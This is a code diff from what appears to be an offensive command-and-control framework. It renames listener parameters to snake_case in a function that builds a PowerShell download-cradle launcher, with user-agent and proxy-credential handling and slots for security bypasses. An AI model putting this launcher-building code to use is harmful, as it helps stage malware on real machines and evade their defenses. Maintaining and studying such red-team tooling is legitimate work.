@@ -195,13 +195,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] = None,
     ):
         bypasses = [] if bypasses is None else bypasses
@@ -219,7 +219,7 @@ class Listener:
 
         if language.startswith("power"):
             launcher = ""
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 launcher += "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                 for bypass in bypasses:
@@ -228,13 +228,13 @@ class Listener:
 
             launcher += "$wc=New-Object System.Net.WebClient;"
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listener_options["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
-            launcher += f"$u='{ userAgent }';"
+                user_agent = profile.split("|")[1]
+            launcher += f"$u='{ user_agent }';"
 
-            if userAgent.lower() != "none" or proxy.lower() != "none":
-                if userAgent.lower() != "none":
+            if user_agent.lower() != "none" or proxy.lower() != "none":
+                if user_agent.lower() != "none":
                     launcher += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
@@ -248,12 +248,12 @@ class Listener:
                         launcher += f"$proxy.Address = '{ proxy.lower() }';"
                         launcher += "$wc.Proxy = $proxy;"
 
-                if proxyCreds.lower() == "default":
+                if proxy_creds.lower() == "default":
                     launcher += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                 else:
-                    username = proxyCreds.split(":")[0]
-                    password = proxyCreds.split(":")[1]
+                    username = proxy_creds.split(":")[0]
+                    password = proxy_creds.split(":")[1]
                     domain = username.split("\\")[0]
                     usr = username.split("\\")[1]
                     launcher += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
@@ -584,13 +584,13 @@ class Listener:
                     log.info(message)
 
         def upload_launcher():
-            ps_launcher = self.mainMenu.stagers.generate_launcher(
+            ps_launcher = self.mainMenu.stagergenv2.generate_launcher(
                 listener_name,
                 language="powershell",
                 encode=False,
-                userAgent="none",
+                user_agent="none",
                 proxy="none",
-                proxyCreds="none",
+                proxy_creds="none",
             )
 
             r = s.put(
